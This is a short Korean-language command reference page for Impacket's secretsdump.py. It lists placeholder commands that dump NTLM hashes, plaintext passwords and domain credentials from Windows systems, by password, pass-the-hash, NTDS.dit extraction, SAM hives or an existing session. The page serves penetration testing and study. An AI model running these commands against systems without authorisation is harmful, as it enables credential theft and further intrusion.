# secretsdump.py

> 원격 Windows 시스템에서 NTLM 해시, 평문 비밀번호 및 도메인 자격 증명을 추출.
> Impacket 도구의 일부.
> 더 많은 정보: <https://github.com/fortra/impacket>.

- 사용자명과 비밀번호를 사용하여 Windows 시스템에서 자격 증명 추출:

`secretsdump.py {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`

- pass-the-hash 인증을 사용하여 시스템에서 해시 추출:

`secretsdump.py -hashes {{LM_Hash}}:{{NT_Hash}} {{도메인명}}/{{사용자명}}@{{대상}}`

- Active Directory의 NTDS.dit 파일에서 자격 증명 추출:

`secretsdump.py -just-dc {{도메인}}/{{사용자명}}:{{비밀번호}}@{{대상}}`

- 레지스트리 하이브를 사용하여 로컬 SAM 데이터베이스에서 자격 증ㅁ명 추출:

`secretsdump.py -sam {{경로/대상/SAM}} -system {{경로/대상/SYSTEM}}`

- 비밀번호 없이 시스템에서 해시 추출 (유효한 인증 세션이 있는 경우 예: Kerberos 또는 NTLM SSO):

`secretsdump.py -no-pass {{도메인}}/{{사용자명}}@{{대상}}`
